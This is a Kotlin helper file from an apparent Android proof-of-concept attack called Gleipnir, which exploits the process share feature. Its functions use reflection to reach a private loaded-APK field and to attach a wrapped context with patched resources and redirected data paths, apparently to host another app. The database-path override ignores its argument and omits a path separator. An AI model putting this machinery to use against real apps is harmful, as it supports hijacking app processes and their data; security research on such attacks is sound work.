/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.helpers.extensions

import android.app.Application
import android.content.ContentResolver
import android.content.Context
import android.content.ContextWrapper
import android.content.pm.PackageInfo
import android.content.res.AssetManager
import android.content.res.Resources
import org.gleipnir.app.extendableLoader.ApplicationPaths
import org.gleipnir.app.extendableLoader.log
import org.gleipnir.app.reflectionHelper.getReflective
import java.io.File

fun Application.getLoadedApk(): Any {
    return getReflective<Any>(this, "mLoadedApk")!!
}

fun Application.attachBaseContext(
    context: Context,
    patchedResources: Resources,
    applicationPaths: ApplicationPaths
) {
    val attachContextMethod = ContextWrapper::class.java.getDeclaredMethod(
        "attachBaseContext",
        Context::class.java
    )

    attachContextMethod.isAccessible = true
    attachContextMethod.invoke(this, object : ContextWrapper(context) {

        override fun getAssets(): AssetManager {
            return super.getAssets()
        }

        override fun getResources(): Resources {
            return patchedResources!!
        }

        override fun getDatabasePath(name: String?): File {
            return File(applicationPaths.dataDir.absolutePath + "databases")
        }

        override fun getDataDir(): File {
            return applicationPaths.dataDir
        }

        override fun getFilesDir(): File {
            return applicationPaths.dataDir
        }

        override fun getContentResolver(): ContentResolver {
            log("CustomContextWrapper [-] getContentResolver called")
            return super.getContentResolver()
        }
    })
}